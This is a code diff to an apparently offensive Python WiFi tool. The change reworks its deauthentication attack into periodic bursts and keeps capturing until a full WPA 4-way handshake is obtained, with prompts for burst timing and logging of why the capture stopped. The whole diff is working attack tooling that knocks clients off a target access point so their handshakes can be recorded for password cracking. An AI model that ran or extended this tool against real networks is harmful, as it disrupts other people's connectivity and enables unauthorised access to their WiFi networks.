@@ -66,6 +66,8 @@ DEFAULT_MONITOR_CHANNELS = (
 DEFAULT_HOP_INTERVAL = 0.8
 DEFAULT_LIVE_UPDATE_INTERVAL = 0.5
 MONITOR_SETTLE_SECONDS = 2.0
+DEFAULT_DEAUTH_BURST_ON_SEC = 3.0
+DEFAULT_DEAUTH_BURST_CYCLE_SEC = 12.0
 
 try:
     from scapy.all import (  # type: ignore
@@ -233,6 +235,19 @@ def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
         return default
     try:
         value = int(raw)
+    except ValueError:
+        return default
+    if value < minimum:
+        return minimum
+    return value
+
+
+def prompt_float(prompt: str, default: float, minimum: float = 0.1) -> float:
+    raw = input(prompt).strip()
+    if not raw:
+        return default
+    try:
+        value = float(raw)
     except ValueError:
         return default
     if value < minimum:
@@ -944,8 +959,10 @@ def next_handshake_pcap_path(output_dir: str, ssid: str) -> str:
 def capture_full_handshakes(
     interface: str,
     ap: AccessPoint,
-    total_duration_sec: int = 45,
-    deauth_duration_sec: int = 20,
+    total_duration_sec: Optional[int] = None,
+    deauth_burst_on_sec: float = DEFAULT_DEAUTH_BURST_ON_SEC,
+    deauth_burst_cycle_sec: float = DEFAULT_DEAUTH_BURST_CYCLE_SEC,
+    stop_on_first_handshake: bool = True,
     output_dir: str = DEFAULT_HANDSHAKE_DIR,
 ) -> Optional[Dict]:
     os.makedirs(output_dir, exist_ok=True)
@@ -965,6 +982,21 @@ def capture_full_handshakes(
     start_time: Optional[float] = None
     started = False
     interrupted = False
+    stop_reason = "unknown"
+
+    if total_duration_sec is not None and total_duration_sec < 1:
+        total_duration_sec = None
+
+    deauth_burst_on_sec = float(deauth_burst_on_sec)
+    if deauth_burst_on_sec > 0:
+        deauth_burst_on_sec = max(0.5, deauth_burst_on_sec)
+        deauth_burst_cycle_sec = max(
+            deauth_burst_on_sec + 0.5,
+            float(deauth_burst_cycle_sec),
+        )
+    else:
+        deauth_burst_on_sec = 0.0
+        deauth_burst_cycle_sec = float(deauth_burst_cycle_sec)
 
     stats_lock = threading.Lock()
     events: "queue.SimpleQueue[tuple[Optional[str], str]]" = queue.SimpleQueue()
@@ -1052,42 +1084,67 @@ def capture_full_handshakes(
             "channel": ap.channel,
         }
 
+        deauth_enabled = DEAUTH_AVAILABLE and deauth_burst_on_sec > 0
         deauth_started = False
         deauth_stop_at: Optional[float] = None
-
-        if deauth_duration_sec > 0 and DEAUTH_AVAILABLE:
-            emit_event("[DEAUTH] Starting deauthentication attack...", COLOR_WARNING)
-            success = False
-            try:
-                success = deauth.start_deauth_attack(
-                    interface,
-                    target_dict,
-                    quiet=not HANDSHAKER_DEAUTH_VERBOSE,
-                )
-            except TypeError:
-                success = deauth.start_deauth_attack(interface, target_dict)
-
-            if success:
-                deauth_started = True
-                deauth_stop_at = start_time + max(1, int(deauth_duration_sec))
-                emit_event("[DEAUTH] Active.", COLOR_SUCCESS)
-            else:
-                emit_event("[DEAUTH] Failed to start; continuing without it.", COLOR_WARNING)
+        next_deauth_start_at: Optional[float] = None
+        if deauth_enabled:
+            next_deauth_start_at = start_time
+            emit_event(
+                (
+                    f"[DEAUTH] Burst mode: {deauth_burst_on_sec:.1f}s ON "
+                    f"every {deauth_burst_cycle_sec:.1f}s."
+                ),
+                COLOR_DIM,
+            )
 
         # Main capture loop.
         while True:
-            elapsed = int(time.time() - start_time)
-            remaining = total_duration_sec - elapsed
-            if remaining <= 0:
+            now = time.time()
+            elapsed = int(now - start_time)
+
+            if total_duration_sec is not None and elapsed >= total_duration_sec:
+                stop_reason = "timeout"
                 break
 
-            if deauth_started and deauth_stop_at and time.time() >= deauth_stop_at:
-                try:
-                    deauth.stop_attack(quiet=True)
-                except TypeError:
-                    deauth.stop_attack()
-                deauth_started = False
-                emit_event("[DEAUTH] Stopped.", COLOR_SUCCESS)
+            if stop_on_first_handshake:
+                with stats_lock:
+                    handshake_snapshot = handshake_count
+                if handshake_snapshot > 0:
+                    stop_reason = "handshake_detected"
+                    emit_event("[CAPTURE] Full handshake detected. Stopping capture.", COLOR_SUCCESS)
+                    break
+
+            if deauth_enabled:
+                if deauth_started and deauth_stop_at and now >= deauth_stop_at:
+                    try:
+                        deauth.stop_attack(quiet=True)
+                    except TypeError:
+                        deauth.stop_attack()
+                    deauth_started = False
+                    emit_event("[DEAUTH] Burst stopped.", COLOR_DIM)
+
+                if (not deauth_started) and next_deauth_start_at and now >= next_deauth_start_at:
+                    emit_event("[DEAUTH] Starting burst...", COLOR_WARNING)
+                    success = False
+                    try:
+                        success = deauth.start_deauth_attack(
+                            interface,
+                            target_dict,
+                            quiet=not HANDSHAKER_DEAUTH_VERBOSE,
+                        )
+                    except TypeError:
+                        success = deauth.start_deauth_attack(interface, target_dict)
+
+                    if success:
+                        deauth_started = True
+                        now = time.time()
+                        deauth_stop_at = now + deauth_burst_on_sec
+                        next_deauth_start_at = now + deauth_burst_cycle_sec
+                        emit_event("[DEAUTH] Burst active.", COLOR_SUCCESS)
+                    else:
+                        next_deauth_start_at = now + deauth_burst_cycle_sec
+                        emit_event("[DEAUTH] Burst failed; retrying next cycle.", COLOR_WARNING)
 
             # Drain asynchronous events (handshake detections).
             while True:
@@ -1105,17 +1162,25 @@ def capture_full_handshakes(
                 m3_snapshot = message_counters[3]
                 m4_snapshot = message_counters[4]
 
+            if total_duration_sec is None:
+                capture_status = f"Capture: {elapsed}s (until full handshake)"
+            else:
+                capture_status = f"Capture: {elapsed}s / {total_duration_sec}s"
+
+            deauth_status = "ON" if deauth_started else "idle"
             status = (
-                f"Capture: {elapsed}s / {total_duration_sec}s   "
+                f"{capture_status}   "
                 f"EAPOL: {eapol_snapshot}   "
                 f"M1/M2/M3/M4: {m1_snapshot}/{m2_snapshot}/{m3_snapshot}/{m4_snapshot}   "
-                f"Handshakes: {handshake_snapshot}"
+                f"Handshakes: {handshake_snapshot}   "
+                f"Deauth: {deauth_status}"
             )
             render_status_line(status)
             time.sleep(1)
 
     except KeyboardInterrupt:
         interrupted = True
+        stop_reason = "interrupted"
     except Exception as exc:
         clear_status_line()
         logging.error("Capture failed: %s", exc)
@@ -1140,6 +1205,12 @@ def capture_full_handshakes(
 
         if interrupted:
             logging.info("Interrupted by user (Ctrl+C).")
+        elif stop_reason == "handshake_detected":
+            logging.info("Capture stopped after full handshake validation.")
+        elif stop_reason == "timeout":
+            logging.info("Capture stopped due to configured timeout.")
+        else:
+            logging.info("Capture stopped.")
 
         if started:
             duration_sec = int(time.time() - (start_time or time.time()))
@@ -1175,7 +1246,8 @@ def capture_full_handshakes(
             "m4": message_counters[4],
         },
         "detected_handshakes": handshake_count,
-        "clients_with_eapol": len(clients_with_eapol)
+        "clients_with_eapol": len(clients_with_eapol),
+        "stop_reason": stop_reason,
     }
 
 
@@ -1262,17 +1334,41 @@ def main() -> None:
         else:
             logging.warning("AP channel unknown; staying on the current channel.")
 
-        capture_total_sec = prompt_int(
-            f"{style('Total capture time', STYLE_BOLD)} (seconds) "
-            f"({style('Enter', STYLE_BOLD)} = 45s): ",
-            default=45,
-            minimum=20
-        )
+        logging.info("")
+        logging.info(style("Capture mode:", STYLE_BOLD))
+        logging.info("Runs until a full 4-way handshake is validated or you press Ctrl+C.")
 
-        # Keep deauth shorter than the total capture window.
-        deauth_sec = min(25, capture_total_sec - 10)
-        if not DEAUTH_AVAILABLE:
-            deauth_sec = 0
+        deauth_burst_on_sec = 0.0
+        deauth_burst_cycle_sec = DEFAULT_DEAUTH_BURST_CYCLE_SEC
+        if DEAUTH_AVAILABLE:
+            logging.info("")
+            raw_burst_on = input(
+                f"{style('Deauth burst ON time', STYLE_BOLD)} in seconds "
+                f"({style('Enter', STYLE_BOLD)} = {DEFAULT_DEAUTH_BURST_ON_SEC:.1f}, 0=disable): "
+            ).strip()
+            if not raw_burst_on:
+                deauth_burst_on_sec = DEFAULT_DEAUTH_BURST_ON_SEC
+            else:
+                try:
+                    deauth_burst_on_sec = float(raw_burst_on)
+                except ValueError:
+                    deauth_burst_on_sec = DEFAULT_DEAUTH_BURST_ON_SEC
+
+            if deauth_burst_on_sec < 0:
+                deauth_burst_on_sec = DEFAULT_DEAUTH_BURST_ON_SEC
+
+            if deauth_burst_on_sec > 0:
+                min_cycle = deauth_burst_on_sec + 0.5
+                deauth_burst_cycle_sec = prompt_float(
+                    f"{style('Deauth burst cycle', STYLE_BOLD)} in seconds "
+                    f"({style('Enter', STYLE_BOLD)} = {DEFAULT_DEAUTH_BURST_CYCLE_SEC:.1f}): ",
+                    default=DEFAULT_DEAUTH_BURST_CYCLE_SEC,
+                    minimum=min_cycle,
+                )
+                if deauth_burst_cycle_sec <= deauth_burst_on_sec:
+                    deauth_burst_cycle_sec = deauth_burst_on_sec + 0.5
+            else:
+                logging.info("Deauth bursts disabled.")
 
         logging.info("")
         input(f"{style('Press Enter', STYLE_BOLD)} to start deauth + capture...")
@@ -1281,8 +1377,10 @@ def main() -> None:
         summary = capture_full_handshakes(
             interface=interface,
             ap=target_ap,
-            total_duration_sec=capture_total_sec,
-            deauth_duration_sec=deauth_sec,
+            total_duration_sec=None,
+            deauth_burst_on_sec=deauth_burst_on_sec,
+            deauth_burst_cycle_sec=deauth_burst_cycle_sec,
+            stop_on_first_handshake=True,
             output_dir=output_dir
         )
 
